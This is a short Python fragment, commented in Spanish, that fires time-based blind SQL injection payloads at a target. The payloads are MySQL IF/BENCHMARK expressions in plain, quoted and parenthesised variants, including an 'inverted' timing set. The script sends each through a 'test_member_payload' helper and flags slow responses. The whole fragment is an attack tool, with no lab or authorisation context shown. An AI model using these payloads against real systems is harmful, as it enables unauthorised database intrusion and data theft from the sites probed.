print("\n" + "="*70)
print("  PROBANDO BENCHMARK INVERTIDO")
print("="*70)

benchmark_payloads = [
    # TRUE debería ser lento
    "1 AND IF(1=1, BENCHMARK(10000000, MD5('x')), 0)",
    "1' AND IF(1=1, BENCHMARK(10000000, MD5('x')), 0)-- -",
    "1) AND IF(1=1, BENCHMARK(10000000, MD5('x')), 0)-- -",
    
    # FALSE debería ser rápido
    "1 AND IF(1=2, BENCHMARK(10000000, MD5('x')), 0)",
    "1' AND IF(1=2, BENCHMARK(10000000, MD5('x')), 0)-- -",
    "1) AND IF(1=2, BENCHMARK(10000000, MD5('x')), 0)-- -",
    
    # Invertido: TRUE -> rápido, FALSE -> lento
    "1 AND IF(1=1, 0, BENCHMARK(10000000, MD5('x')))",
    "1' AND IF(1=1, 0, BENCHMARK(10000000, MD5('x')))-- -",
    "1 AND IF(1=2, 0, BENCHMARK(10000000, MD5('x')))",
    "1' AND IF(1=2, 0, BENCHMARK(10000000, MD5('x')))-- -",
]

for payload in benchmark_payloads:
    t, l = test_member_payload(payload)
    status = "🔴" if t > 2 else "🟢"
    print(f"{status} {payload[:50]:50} -> {t:.2f}s, Length: {l}")
    time.sleep(0.3)
